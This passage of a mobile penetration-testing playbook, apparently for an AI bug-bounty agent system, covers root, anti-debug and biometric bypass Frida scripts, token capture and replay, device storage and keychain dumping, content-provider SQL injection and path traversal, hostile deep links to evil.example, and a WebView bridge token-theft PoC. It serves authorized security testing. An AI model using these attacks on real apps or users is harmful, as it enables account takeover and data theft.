**Dispatch:** -> AndroidAgent / iOSAgent; native pinning -> ReverseEngineeringAgent.

### 2.D Root / jailbreak detection bypass

**Objective / hypothesis:** Get the app to run on the instrumented (rooted/jailbroken) device. Bypassable root/JB detection is MASVS-RESILIENCE.

**Procedure:**
```bash
objection -g "$TARGET" explore -q \
  -c "android root disable" -c "ios jailbreak disable" 2>&1 | tee "$DYNAMIC_DIR/objection-root.log"

cat > "$DYNAMIC_DIR/root_bypass.js" <<'JS'
Java.perform(function () {
  try { var RB = Java.use('com.scottyab.rootbeer.RootBeer');
    RB.isRooted.implementation = function () { return false; }; } catch (e) {}
  var F = Java.use('java.io.File');
  F.exists.implementation = function () {
    var p = this.getAbsolutePath();
    if (/su|magisk|supersu|busybox|xposed/i.test(p)) return false;
    return this.exists();
  };
  var R = Java.use('java.lang.Runtime');
  R.exec.overload('java.lang.String').implementation = function (c) {
    if (/su|which|magisk/i.test(c)) throw Java.use('java.io.IOException').$new('nf');
    return this.exec(c);
  };
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/root_bypass.js" -o "$DYNAMIC_DIR/frida-root.log" --no-pause
```

**Indicators:** App proceeds past the "rooted device" wall.
**Validation:** App functions normally under instrumentation; capture the pre-bypass block screen as evidence.
**Evasion / edge cases:** Native root checks in `.so` (hook in Phase 9), Play Integrity / SafetyNet hardware attestation (see 8.D — not bypassable by file hooks; needs a clean device or attestation downgrade), iOS JB checks via `fork`/`stat`/dyld image enum.
**Severity:** Bypassable detection = Low-Medium (MASVS-RESILIENCE).
**Dispatch:** -> AndroidAgent / iOSAgent.

### 2.E Anti-debug / anti-hook neutralization + dual identity

**Procedure:**
```bash
cat > "$DYNAMIC_DIR/anti_debug.js" <<'JS'
Java.perform(function () {
  var D = Java.use('android.os.Debug');
  D.isDebuggerConnected.implementation = function () { return false; };
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/anti_debug.js" -o "$DYNAMIC_DIR/frida-antidebug.log" --no-pause

# Dual identity: run two app instances / two devices, log in as low-priv and admin,
# and capture $TOKEN_LOW / $TOKEN_HIGH in Phase 3.
```

**Phase artifacts:** Bypass scripts (`ssl_bypass.js`, `root_bypass.js`, `anti_debug.js`), `objection-*.log`, `frida-*.log`, proven decrypted traffic in Burp.
**Gate-out:** App runs instrumented with traffic decrypting through Burp under both identities; pinning, root/JB, and anti-debug controls neutralized (and each bypass logged as a resilience observation).

---

## Phase 3: NETWORK & TRAFFIC ANALYSIS

**Objective:** Capture and enumerate every backend interaction, extract endpoints and tokens, and verify transport security.
**Expert rationale:** This phase produces the endpoint inventory that powers the entire backend track (Phase 10) — the highest-value output of the whole engagement.
**Gate-in:** Phase 2 — traffic decrypts under both identities.
**Parallelizable:** Endpoint discovery, token analysis, and cleartext detection run together while you drive the app through every feature.

### 3.A Traffic capture & TLS validation

**Objective / hypothesis:** Drive every feature with bypass active and capture all traffic. Confirm the server-side TLS posture is sane.

**Procedure:**
```bash
# Launch with bypass and exercise the full app (login, browse, pay, settings).
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/ssl_bypass.js" --no-pause &

# Export everything Burp saw to HAR for offline analysis + replay
bun $TOOLS/burp-bridge.ts --export-har --output "$HAR_DIR/mobile-traffic.har"
bun $TOOLS/burp-bridge.ts --history --filter "host:target.com" > "$HAR_DIR/history.json"
```
**Indicators:** Decrypted request/response pairs for every feature.
**Validation:** `jq '.log.entries | length' "$HAR_DIR/mobile-traffic.har"` is non-trivial; each major feature is represented.
**Severity:** N/A (enabling).
**Dispatch:** -> APIAgent (receives the HAR + endpoint list).

### 3.B Endpoint & parameter discovery

**Procedure:**
```bash
# Unique endpoints from live traffic + static
jq -r '.log.entries[].request.url' "$HAR_DIR/mobile-traffic.har" 2>/dev/null \
  | sed 's/?.*//' | sort -u > "$HAR_DIR/endpoints-dynamic.txt"
cat "$HAR_DIR/endpoints-dynamic.txt" "$HAR_DIR/static-endpoints.txt" | sort -u \
  > "$HAR_DIR/endpoints-all.txt"
# Versioning / admin / debug surface
grep -nE '/v[0-9]+/|/api/|/internal|/admin|/debug|/graphql|/actuator' "$HAR_DIR/endpoints-all.txt"
```
**Indicators:** Hidden API versions, admin/internal/debug routes, GraphQL endpoint.
**Validation:** Probe each (proxied, in scope) for reachability and auth requirement.
**Dispatch:** -> APIAgent, -> IDORAgent, -> SSRFAgent (Phase 10).

### 3.C Token & auth-material analysis

**Objective / hypothesis:** Capture how the app obtains, stores, and transmits auth material. Long-lived/static tokens and JWTs with `alg:none`/weak secrets are high impact.

**Procedure:**
```bash
# Pull Authorization headers + cookie/token shapes
jq -r '.log.entries[].request.headers[] | select(.name|ascii_downcase=="authorization") | .value' \
  "$HAR_DIR/mobile-traffic.har" | sort -u | tee "$HAR_DIR/auth-headers.txt"

# Runtime token capture (SharedPreferences + OkHttp headers)
cat > "$DYNAMIC_DIR/token_intercept.js" <<'JS'
Java.perform(function () {
  try { var E = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
    E.putString.implementation = function (k, v) {
      if (/token|auth|session|jwt|refresh/i.test(k)) console.log('[pref] '+k+'='+v);
      return this.putString(k, v); }; } catch (e) {}
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/token_intercept.js" -o "$DYNAMIC_DIR/frida-token.log" --no-pause
```
**Indicators:** JWTs (decode header/claims), static API keys as bearer, refresh tokens in prefs, tokens with no `exp`.
**Validation:** Decode JWT (`echo $JWT | cut -d. -f2 | base64 -d`); test `alg:none` and known-weak HMAC secrets in Phase 6/10.
**Evasion / edge cases:** Tokens sometimes ride custom headers (`X-Auth`, `X-Api-Key`) or request bodies; mTLS client certs in keychain/keystore.
**Severity:** Static/long-lived privileged token = High-Critical.
**Dispatch:** -> AuthAgent, -> OAuthAgent.

### 3.D Cleartext / non-HTTP / WebSocket traffic

**Objective / hypothesis:** Any sensitive data over HTTP, or weak ATS/`usesCleartextTraffic`, is MASVS-NETWORK. WebSockets and gRPC are frequently under-tested.

**Procedure:**
```bash
# Cleartext requests in capture
jq -r '.log.entries[].request.url' "$HAR_DIR/mobile-traffic.har" | grep -E '^http://' \
  | sort -u | tee "$HAR_DIR/cleartext.txt"
# WebSocket frames: enable WebSockets history in Burp; export and inspect
# gRPC: confirm protobuf over HTTP/2 and decode with Burp's protobuf / grpcurl
```
**Indicators:** Any `http://` carrying credentials/PII; WS messages with tokens; ATS `NSAllowsArbitraryLoads`.
**Validation:** Confirm the cleartext request actually carries sensitive data (not just an analytics ping you must ignore as out of scope).
**Severity:** Credentials/PII over cleartext = High (CVSS ~7.4).
**Dispatch:** -> AndroidAgent / iOSAgent (config), -> APIAgent (WS/gRPC).

**Phase artifacts:** `mobile-traffic.har`, `endpoints-all.txt`, `auth-headers.txt`, `cleartext.txt`, captured `$TOKEN_LOW`/`$TOKEN_HIGH`.
**Gate-out:** Complete endpoint inventory + token model documented; transport posture assessed. Hand off to Phase 10 begins in parallel.

---

## Phase 4: DATA STORAGE AUDIT (MASVS-STORAGE)

**Objective:** Find sensitive data persisted insecurely anywhere on the device.
**Expert rationale:** Local storage leaks are the most consistently-paid mobile bug after backend bugs, and trivially reproducible.
**Gate-in:** App exercised through all features (Phase 3), so caches/DBs are populated.
**Parallelizable:** All sub-techniques are independent reads.

### 4.A Shared preferences / NSUserDefaults

**Objective / hypothesis:** Tokens, PII, PINs frequently land in plaintext prefs.
**Procedure:**
```bash
# Android
adb -s "$DEVICE_ANDROID" shell run-as "$TARGET" \
  sh -c 'cat /data/data/'"$TARGET"'/shared_prefs/*.xml' \
  | tee "$STORAGE_DIR/shared_prefs.xml" \
  | grep -iE 'password|token|secret|pin|ssn|card|email|jwt|session'
# iOS
objection -g "$TARGET" explore -q -c "ios nsuserdefaults get" \
  | tee "$STORAGE_DIR/nsuserdefaults.txt"
```
**Indicators:** Plaintext secrets/PII in prefs/defaults.
**Validation:** Confirm value is real (matches a live token from Phase 3).
**Evasion / edge cases:** Check EncryptedSharedPreferences misuse (key in same store), `apply()` race files, `*.xml.bak`.
**Severity:** Plaintext credentials/token at rest = High (CVSS ~6.5-7.5).
**Dispatch:** -> AndroidAgent / iOSAgent.

### 4.B SQLite / Realm / Core Data

**Procedure:**
```bash
adb -s "$DEVICE_ANDROID" shell run-as "$TARGET" \
  sh -c 'cd /data/data/'"$TARGET"'/databases && tar c .' > "$STORAGE_DIR/dbs.tar"
mkdir -p "$STORAGE_DIR/dbs" && tar xf "$STORAGE_DIR/dbs.tar" -C "$STORAGE_DIR/dbs"
for db in "$STORAGE_DIR/dbs"/*.db; do
  echo "== $db =="; sqlite3 "$db" '.tables'
  sqlite3 "$db" '.dump' | grep -iE 'password|token|secret|card|ssn|session'
done
# iOS: objection 'ios cocoapods'/sqlite paths, or pull the sandbox via scp; Realm via realm-studio
```
**Indicators:** Sensitive rows; unencrypted SQLCipher (DB opens without key).
**Validation:** Open the DB with no key; confirm sensitive content.
**Severity:** Plaintext sensitive DB = High.
**Dispatch:** -> AndroidAgent / iOSAgent.

### 4.C File system storage (internal/external)

**Procedure:**
```bash
adb -s "$DEVICE_ANDROID" shell run-as "$TARGET" \
  find /data/data/"$TARGET"/ -type f \( -name '*.json' -o -name '*.txt' -o -name '*.xml' \
  -o -name '*.log' -o -name '*.dat' \) | tee "$STORAGE_DIR/internal-files.txt"
# World-readable / external storage (no run-as needed -> cross-app readable = worse)
adb -s "$DEVICE_ANDROID" shell ls -laR /sdcard/Android/data/"$TARGET"/ 2>/dev/null \
  | tee "$STORAGE_DIR/external-files.txt"
adb -s "$DEVICE_ANDROID" shell run-as "$TARGET" find /data/data/"$TARGET"/ -perm -o+r -type f
```
**Indicators:** Sensitive files on external storage (world/other-app readable) or world-readable internal files.
**Validation:** Read the file from outside `run-as` (or another app context) to prove cross-app exposure.
**Severity:** Sensitive data on shared/external storage = High.
**Dispatch:** -> AndroidAgent / iOSAgent.

### 4.D Application logs

**Procedure:**
```bash
adb -s "$DEVICE_ANDROID" logcat -d | grep -iE "$TARGET|token|password|authorization|card" \
  | tee "$STORAGE_DIR/logcat.txt"
# Reproduce: clear log, drive sensitive flow, dump
adb -s "$DEVICE_ANDROID" logcat -c
# (perform login / payment)
adb -s "$DEVICE_ANDROID" logcat -d > "$STORAGE_DIR/logcat-after-login.txt"
```
**Indicators:** Secrets/PII/full requests in logcat (or iOS unified log).
**Validation:** Map the leaked value to a live secret.
**Severity:** Credentials in logs = High (any local-log reader / malicious app with READ_LOGS on old devices).
**Dispatch:** -> AndroidAgent / iOSAgent.

### 4.E Keyboard cache / autofill residue

**Objective / hypothesis:** Sensitive fields not flagged non-suggesting leak into the keyboard dictionary (Android) / text replacement (iOS).
**Procedure:**
```bash
# Android: check that sensitive EditTexts use textNoSuggestions/textPassword inputType
grep -rnE 'inputType|textNoSuggestions|textPassword' "$STATIC_DIR/apktool/res/layout" | head
# Inspect the user dictionary after typing into a sensitive field (test device)
adb -s "$DEVICE_ANDROID" shell content query --uri content://user_dictionary/words 2>/dev/null
```
**Indicators:** Sensitive tokens cached in the user dictionary; password fields lacking `textNoSuggestions`.
**Validation:** Type a marker into a sensitive field, then dump the dictionary and confirm the marker.
**Severity:** Low-Medium (MASVS-STORAGE).
**Dispatch:** -> AndroidAgent / iOSAgent.

### 4.F Clipboard exposure (at rest)

**Procedure:**
```bash
# Hook clipboard writes to see if the app copies secrets (e.g. "copy token / OTP / card")
cat > "$DYNAMIC_DIR/clipboard.js" <<'JS'
Java.perform(function () {
  var CM = Java.use('android.content.ClipboardManager');
  CM.setPrimaryClip.implementation = function (clip) {
    try { console.log('[clip-set] ' + clip.getItemAt(0).getText()); } catch (e) {}
    return this.setPrimaryClip(clip);
  };
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/clipboard.js" -o "$DYNAMIC_DIR/frida-clip.log" --no-pause
```
**Indicators:** App writes secrets/OTP/card to a non-sensitive clipboard (readable by any app pre-Android 13 / non-sensitive iOS pasteboard).
**Validation:** Read clipboard from a second app/process and confirm the secret.
**Severity:** Medium (cross-app exposure). See 7.G for the platform-interaction angle.
**Dispatch:** -> AndroidAgent / iOSAgent.

### 4.G Backups (auto-backup / adb backup / iTunes-iCloud)

**Procedure:**
```bash
# Android (if allowBackup=true and backup transport allows)
adb -s "$DEVICE_ANDROID" backup -f "$STORAGE_DIR/backup.ab" -noapk "$TARGET"
( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; tail -c +25 "$STORAGE_DIR/backup.ab" ) \
  | tar xfvz - -C "$STORAGE_DIR/backup" 2>/dev/null
grep -riE 'token|password|secret' "$STORAGE_DIR/backup" 2>/dev/null
# iOS: check files lack NSURLIsExcludedFromBackupKey -> backed up to iCloud/iTunes unencrypted
```
**Indicators:** `allowBackup="true"` (Android) yielding sensitive data; iOS files not excluded from backup.
**Validation:** Extract the backup and confirm sensitive content is present.
**Severity:** Sensitive data extractable via backup = Medium-High.
**Dispatch:** -> AndroidAgent / iOSAgent.

### 4.H Screenshot / task-switcher snapshot leakage

**Procedure:**
```bash
# Android: backgrounding a sensitive screen without FLAG_SECURE caches a thumbnail
grep -rnE 'FLAG_SECURE|setFlags|WindowManager' "$STATIC_DIR/jadx/sources" | grep -i secure | head
# iOS: app must blur/cover the snapshot in applicationDidEnterBackground;
adb -s "$DEVICE_ANDROID" shell ls /data/system_ce/0/snapshots 2>/dev/null
```
**Indicators:** Sensitive screen lacks `FLAG_SECURE`; readable snapshot of a sensitive view.
**Validation:** Background the app on a sensitive screen, retrieve the snapshot, confirm sensitive content.
**Severity:** Low-Medium.
**Dispatch:** -> AndroidAgent / iOSAgent.

**Phase artifacts:** `shared_prefs.xml`, `nsuserdefaults.txt`, `dbs/`, `internal-files.txt`, `external-files.txt`, `logcat*.txt`, clipboard/snapshot evidence, `backup/`.
**Gate-out:** Every storage location enumerated; each sensitive-at-rest item recorded as a candidate finding with a reproducible read.

---

## Phase 5: CRYPTOGRAPHY AUDIT (MASVS-CRYPTO)

**Objective:** Identify weak algorithms, hardcoded/predictable keys, KeyStore/Keychain misuse, and weak randomness.
**Expert rationale:** Mobile crypto is usually home-rolled around platform keystores; the failure is rarely the cipher and usually the key management.
**Gate-in:** Static crypto references from 1.B/1.D; runtime hooks available from Phase 2.

### 5.A Weak / deprecated algorithms

**Procedure:**
```bash
grep -rnE 'Cipher\.getInstance\("?(DES|DESede|RC4|RC2|Blowfish|AES/ECB)|MessageDigest\.getInstance\("?(MD5|SHA-1)|"AES/CBC/NoPadding"' \
  "$STATIC_DIR/jadx/sources" | tee "$STATIC_DIR/weak-crypto.txt"
# Runtime confirmation: hook Cipher.getInstance to see actual transforms used
cat > "$DYNAMIC_DIR/crypto.js" <<'JS'
Java.perform(function () {
  var C = Java.use('javax.crypto.Cipher');
  C.getInstance.overload('java.lang.String').implementation = function (t) {
    console.log('[cipher] ' + t); return this.getInstance(t);
  };
  var MD = Java.use('java.security.MessageDigest');
  MD.getInstance.overload('java.lang.String').implementation = function (a) {
    console.log('[digest] ' + a); return this.getInstance(a);
  };
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/crypto.js" -o "$DYNAMIC_DIR/frida-crypto.log" --no-pause
```
**Indicators:** ECB mode, DES/RC4, MD5/SHA-1 for security purposes, `NoPadding` misuse.
**Validation:** Confirm the weak primitive protects something sensitive (e.g., stored tokens), not just a checksum.
**Severity:** Weak crypto protecting credentials/PII = Medium-High.
**Dispatch:** -> iOSAgent / AndroidAgent; deep -> ReverseEngineeringAgent.

### 5.B Hardcoded keys / static IVs

**Procedure:**
```bash
grep -rnE 'SecretKeySpec\(|IvParameterSpec\(|new byte\[\]\s*\{|"[0-9a-fA-F]{32,}"' \
  "$STATIC_DIR/jadx/sources" | tee "$STATIC_DIR/hardcoded-keys.txt"
# Hook key/IV construction to capture material at runtime
cat > "$DYNAMIC_DIR/keys.js" <<'JS'
Java.perform(function () {
  var SKS = Java.use('javax.crypto.spec.SecretKeySpec');
  SKS.$init.overload('[B','java.lang.String').implementation = function (k, a) {
    console.log('[key] alg='+a+' bytes='+JSON.stringify(Array.from(k))); return this.$init(k, a);
  };
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/keys.js" -o "$DYNAMIC_DIR/frida-keys.log" --no-pause
```
**Indicators:** Static key/IV bytes in code or captured identically across runs.
**Validation:** Decrypt a captured ciphertext (e.g., stored token) with the recovered key to prove it.
**Severity:** Hardcoded key protecting sensitive data = High (CVSS ~7.x).
**Dispatch:** -> SecretsExposureAgent, -> ReverseEngineeringAgent.

### 5.C KeyStore / Keychain / Data Protection misuse

**Objective / hypothesis:** Keys not hardware-backed, missing user-auth binding, or keychain items with weak accessibility classes are exploitable on a compromised/locked device.
**Procedure:**
```bash
# Android: KeyStore usage + setUserAuthenticationRequired / StrongBox
grep -rnE 'AndroidKeyStore|KeyGenParameterSpec|setUserAuthenticationRequired|setIsStrongBoxBacked|setUnlockedDeviceRequired' \
  "$STATIC_DIR/jadx/sources" | tee "$STATIC_DIR/keystore-usage.txt"
# iOS: keychain accessibility classes
objection -g "$TARGET" explore -q -c "ios keychain dump --json" \
  | tee "$STORAGE_DIR/keychain.json"
grep -iE 'kSecAttrAccessibleAlways|AfterFirstUnlock(ThisDeviceOnly)?' "$STORAGE_DIR/keychain.json"
```
**Indicators:** Keys without `setUserAuthenticationRequired`; keychain items `kSecAttrAccessibleAlways`/`AfterFirstUnlock` for highly-sensitive secrets; no `ThisDeviceOnly` (syncs to iCloud).
**Validation:** Dump the keychain on a locked/backgrounded device; confirm sensitive item is retrievable.
**Severity:** Sensitive secret with weak accessibility / no auth binding = Medium-High.
**Dispatch:** -> iOSAgent / AndroidAgent.

### 5.D Weak randomness

**Procedure:**
```bash
grep -rnE 'new Random\(|Math\.random|System\.currentTimeMillis\(\).*token|util\.Random' \
  "$STATIC_DIR/jadx/sources" | tee "$STATIC_DIR/weak-random.txt"
```
**Indicators:** `java.util.Random`/`Math.random` for tokens/OTP/nonces instead of `SecureRandom`/`arc4random`.
**Validation:** Collect multiple generated values; show predictability/low entropy.
**Severity:** Predictable security token = High; predictable non-security value = Low.
**Dispatch:** -> ReverseEngineeringAgent, backend impact -> AuthAgent.

**Phase artifacts:** `weak-crypto.txt`, `hardcoded-keys.txt`, `keystore-usage.txt`, `keychain.json`, `frida-crypto/keys.log`.
**Gate-out:** Crypto inventory complete with each weakness tied to the sensitive asset it fails to protect.

---

## Phase 6: AUTHENTICATION & SESSION (MASVS-AUTH)

**Objective:** Test local auth, biometric gating, token handling, and session lifecycle.
**Expert rationale:** Client-side auth gates are advisory; the real questions are whether the *server* enforces auth and whether tokens are durable, scoped, and revocable.
**Gate-in:** Tokens captured (3.C); both identities live.

### 6.A Local authentication / PIN

**Objective / hypothesis:** Local PIN/pattern gates that only protect a client-side boolean (not a server check) are bypassable.
**Procedure:**
```bash
# Identify the local-auth gate and what it actually unlocks
grep -rnE 'isAuthenticated|unlockApp|checkPin|verifyPin|onAuthenticationSucceeded' \
  "$STATIC_DIR/jadx/sources" | head
objection -g "$TARGET" explore -q -c "android hooking search methods auth" \
  | tee "$DYNAMIC_DIR/auth-methods.txt"
```
**Indicators:** Local gate returns a boolean with no server-side session change.
**Validation:** Hook the gate to return success (Phase 7.* style) and confirm access without the PIN; verify the backend still required a real session.
**Severity:** Local-only gate = Low-Medium; if it also exposes server data without server auth = High.
**Dispatch:** -> AuthAgent.

### 6.B Biometric bypass

**Objective / hypothesis:** Biometric `onAuthenticationSucceeded` that is not bound to a crypto object (KeyStore-released CryptoObject) is bypassable by forcing the callback.
**Procedure:**
```bash
cat > "$DYNAMIC_DIR/biometric.js" <<'JS'
Java.perform(function () {
  try {
    var BP = Java.use('androidx.biometric.BiometricPrompt');
    BP.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo')
      .implementation = function (info) { console.log('[bio] AndroidX prompt suppressed'); };
  } catch (e) {}
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/biometric.js" -o "$DYNAMIC_DIR/frida-bio.log" --no-pause
# iOS: bypass LAContext.evaluatePolicy
objection -g "$TARGET" explore -q -c "ios ui biometrics_bypass" | tee "$DYNAMIC_DIR/ios-bio.txt"
```
**Indicators:** Forcing `onAuthenticationSucceeded` / `evaluatePolicy=>true` grants access.
**Validation:** Critically — check whether protected data is gated by a **CryptoObject** key release. If the secret is only decrypted on real biometric success, the bypass is cosmetic; if access is a boolean, it is a true bypass.
**Evasion / edge cases:** `setUserAuthenticationRequired(true)` keys cannot be released by a faked callback; LAContext without `kSecAccessControlBiometryCurrentSet` is weaker.
**Severity:** True biometric bypass to sensitive data = High (CVSS ~7-8).
**Dispatch:** -> AuthAgent.

### 6.C Token handling

**Procedure:**
```bash
# Re-use captured token after logout / expiry windows / from another device
curl -s -x "$PROXY" -A "$UA" -H "Authorization: Bearer $TOKEN_LOW" \
  "https://api.target.com/v1/users/me" -k -o "$FINDINGS_DIR/token-reuse.json" -w "%{http_code}\n"
```
**Indicators:** Token valid after logout; no `exp`; same token across devices; refresh token never rotates.
**Validation:** Logout in-app, replay token; confirm still authorized server-side.
**Severity:** No server-side revocation / non-expiring token = High.
**Dispatch:** -> AuthAgent, -> OAuthAgent.

### 6.D Session management

**Procedure:**
```bash
# Concurrency, fixation, refresh rotation, logout invalidation — exercise via captured requests
# (replay $TOKEN_LOW and $TOKEN_HIGH across endpoints; observe 401 vs 200 transitions)
```
**Indicators:** Concurrent sessions unbounded; refresh token reuse accepted; logout not invalidating server session.
**Validation:** Replay sequences and confirm server behavior; capture HTTP deltas as evidence.
**Severity:** Broken session invalidation = High.
**Dispatch:** -> AuthAgent.

**Phase artifacts:** `auth-methods.txt`, `frida-bio.log`, `token-reuse.json`, session-test HARs.
**Gate-out:** Local-auth, biometric, token, and session behavior characterized; each weakness has a server-confirmed PoC.

---

## Phase 7: PLATFORM INTERACTION (MASVS-PLATFORM)

**Objective:** Attack every IPC and inter-app edge: exported components, content providers, deep/app/universal links, intent redirection, WebView bridges, URL schemes, pasteboard.
**Expert rationale:** This is the on-device attack surface a malicious app or a crafted link can reach — the classic mobile bug class with real cross-app impact.
**Gate-in:** Exported inventory (1.A); app installed (2.A).
**Parallelizable:** 7.A-7.G are independent; provider tests (7.B) and link tests (7.C/F) can run together.

### 7.A Exported component injection (activities / services / receivers)

**Objective / hypothesis:** Exported components invokable by any app can leak data, perform privileged actions, or import attacker-controlled state.
**Procedure:**
```bash
adb -s "$DEVICE_ANDROID" shell dumpsys package "$TARGET" | grep -A2 'exported=true' \
  | tee "$DYNAMIC_DIR/exported-runtime.txt"
# Launch exported activity with attacker-controlled extras
adb -s "$DEVICE_ANDROID" shell am start -n "$TARGET/.ExportedActivity" \
  -a android.intent.action.VIEW -d "https://evil.example" --es redirect "https://evil.example"
# Fire an exported receiver / start an exported service
adb -s "$DEVICE_ANDROID" shell am broadcast -n "$TARGET/.SomeReceiver" --es data "INJECT"
adb -s "$DEVICE_ANDROID" shell am startservice -n "$TARGET/.SomeService" --es cmd "INJECT"
# drozer for systematic enumeration
drozer console connect 2>/dev/null <<'DRZ'
run app.activity.info -a com.target.app
run app.service.info -a com.target.app
run app.broadcast.info -a com.target.app
DRZ
```
**Indicators:** Component performs a state change / reveals data without the caller holding the expected permission; crash (DoS) on malformed extras.
**Validation:** Reproduce from an unprivileged context (no signature permission); confirm the effect server-side or in UI.
**Evasion / edge cases:** `android:permission` may gate the component — check it is a *normal* (not signature) permission; `taskAffinity`/`launchMode` enable StrandHogg-style task hijack.
**Severity:** Privileged action via exported component = High-Critical.
**Dispatch:** -> AndroidAgent.

### 7.B Content provider SQLi & path traversal

**Objective / hypothesis:** Exported providers backed by SQLite are classic injection; file-providers are classic traversal.
**Procedure:**
```bash
# Enumerate provider authorities
grep -nE '<provider' "$STATIC_DIR/apktool/AndroidManifest.xml"
# Query + injection attempts
adb -s "$DEVICE_ANDROID" shell content query --uri content://com.target.app.provider/users
adb -s "$DEVICE_ANDROID" shell content query \
  --uri content://com.target.app.provider/users --where "1=1"
adb -s "$DEVICE_ANDROID" shell content query \
  --uri "content://com.target.app.provider/users" --projection "* FROM sqlite_master--"
# Path traversal on a file provider
adb -s "$DEVICE_ANDROID" shell content read \
  --uri "content://com.target.app.fileprovider/../../../../data/data/com.target.app/shared_prefs/prefs.xml"
# drozer scanners
drozer console connect 2>/dev/null <<'DRZ'
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
run scanner.provider.finduris -a com.target.app
DRZ
```
**Indicators:** Injection returns extra rows / `sqlite_master` schema; traversal returns file contents outside the provider's intended path.
**Validation:** Extract a known sensitive file/row via the provider from an unprivileged context.
**Evasion / edge cases:** `--where` quoting differs by shell; UNION needs matching column counts (read schema first); some providers require a permission attacker apps can hold.
**Severity:** Provider SQLi exposing user data = High-Critical; arbitrary file read = High.
**Dispatch:** -> SQLiAgent (injection), -> AndroidAgent (traversal/provider config).

### 7.C Deep link / App Link hijack & parameter injection

**Objective / hypothesis:** Deep links carry attacker-controlled data into sensitive handlers (open redirect, auth-code theft, WebView load, account actions). Unverified App Links are hijackable by a competing app.
**Procedure:**
```bash
# Test handlers with hostile params
adb -s "$DEVICE_ANDROID" shell am start -W -a android.intent.action.VIEW \
  -d "https://target.com/open?next=https://evil.example" "$TARGET"
adb -s "$DEVICE_ANDROID" shell am start -W -a android.intent.action.VIEW \
  -d "targetapp://auth/callback?code=ATTACKER&state=x" "$TARGET"
# App Link verification status (autoVerify)
adb -s "$DEVICE_ANDROID" shell pm get-app-links "$TARGET"
# Prefer recon's pre-dumped file if present (content/policy-.well-known-assetlinks.json.dump),
# else fetch live. The associated web/API hosts here are in-scope backend for Phase 10.
RECON_AL=~/.claude/MEMORY/BugBounty/Sessions/${BACKEND_SLUG:-$TARGET_SLUG}/recon/content/policy-.well-known-assetlinks.json.dump
( [ -f "$RECON_AL" ] && cat "$RECON_AL" \
  || curl -s -x "$PROXY" -A "$UA" "https://target.com/.well-known/assetlinks.json" -k ) | jq .
```
**Indicators:** Redirect to attacker host; auth code/token consumed from attacker-supplied value; WebView loads attacker URL; App Links `legacy_failure`/unverified.
**Validation:** Confirm the sensitive action occurs (redirect lands, code is exchanged, session created).
**Evasion / edge cases:** Chained schemes (`intent://` with fallback URL), double-encoding `next` to bypass allowlists, missing `autoVerify` letting a malicious app register the same `https` host.
**Severity:** Auth-code/token theft via deep link = Critical; open redirect = Low-Medium.
**Dispatch:** -> AndroidAgent, redirect/SSRF angle -> SSRFAgent, auth-code -> OAuthAgent.

### 7.D Intent redirection / pending-intent abuse

**Objective / hypothesis:** A component that forwards a caller-supplied Intent (or hands out a mutable PendingIntent) lets an attacker reach internal/un-exported components or escalate with the app's identity.
**Procedure:**
```bash
grep -rnE 'getParcelableExtra\(.*Intent|startActivity\(.*getIntent|PendingIntent\.(getActivity|getBroadcast)' \
  "$STATIC_DIR/jadx/sources" | tee "$STATIC_DIR/intent-redirect.txt"
# Send a nested Intent extra pointing at an internal component
adb -s "$DEVICE_ANDROID" shell am start -n "$TARGET/.ProxyActivity" \
  --es forward "intent:#Intent;component=$TARGET/.InternalActivity;end"
```
**Indicators:** Internal/un-exported component reached; action performed with app privileges.
**Validation:** Confirm the internal component executed via logcat/UI.
**Evasion / edge cases:** Implicit PendingIntent without `FLAG_IMMUTABLE` (pre-Android 12) is hijackable; `Intent.parseUri` flags.
**Severity:** Internal component access / privilege use = High.
**Dispatch:** -> AndroidAgent.

### 7.E WebView JS bridge & RCE

**Objective / hypothesis:** `addJavascriptInterface` exposes native methods to JS; combined with loadable attacker content (deep link, cleartext, file://) it is RCE-grade. `setAllowFileAccess`/`setJavaScriptEnabled` + `file://` access enables local file theft.
**Procedure:**
```bash
grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|setAllowFileAccess|setAllowUniversalAccessFromFileURLs|loadUrl\(|shouldOverrideUrlLoading|@JavascriptInterface' \
  "$STATIC_DIR/jadx/sources" | tee "$STATIC_DIR/webview.txt"
# If a deep link controls the WebView URL, point it at a payload page that calls the bridge
adb -s "$DEVICE_ANDROID" shell am start -W -a android.intent.action.VIEW \
  -d "targetapp://web?url=http://$PROXY_HOST:8000/bridge-poc.html" "$TARGET"
```
PoC page (`bridge-poc.html`, served over the proxy host) enumerates and calls the exposed interface:
```html
<script>
for (var k in window) { try { document.title += k + ' '; } catch(e){} }
/* e.g. if AndroidBridge.getToken() exists: */
try { document.body.innerText = AndroidBridge.getToken(); } catch(e){}
</script>
```
**Indicators:** JS reaches a `@JavascriptInterface` method returning sensitive data or performing native actions; `file://` content read into the WebView.
**Validation:** Demonstrate data exfil or a native action triggered purely from attacker-controlled web content.
**Evasion / edge cases:** Pre-API17 interfaces expose reflection -> `Runtime.exec` RCE; `setAllowUniversalAccessFromFileURLs(true)` enables cross-origin local read; `shouldOverrideUrlLoading` allowlist bypass via redirects.
**Severity:** Bridge RCE / token theft = Critical (CVSS ~9.x).
**Dispatch:** -> AndroidAgent, -> RCEAgent is not in roster — confirmed by ValidatorAgent and chained by ExploitChainAgent.

### 7.F iOS URL scheme / universal link hijack

**Objective / hypothesis:** Custom schemes are claimable by other apps; universal-link handlers carry attacker data into sensitive flows.
**Procedure:**
```bash
plutil -p "$APP/Info.plist" | grep -A10 'CFBundleURLTypes'
# Trigger scheme/universal link handling and hook the entry point
cat > "$DYNAMIC_DIR/url_scheme.js" <<'JS'
if (ObjC.available) {
  var name = Object.keys(ObjC.classes).find(function (n){ return /AppDelegate/.test(n); });
  var m = ObjC.classes[name] && ObjC.classes[name]['- application:openURL:options:'];
  if (m) Interceptor.attach(m.implementation, { onEnter: function (a) {
    console.log('[scheme] ' + ObjC.Object(a[3]).absoluteString()); } });
}
JS
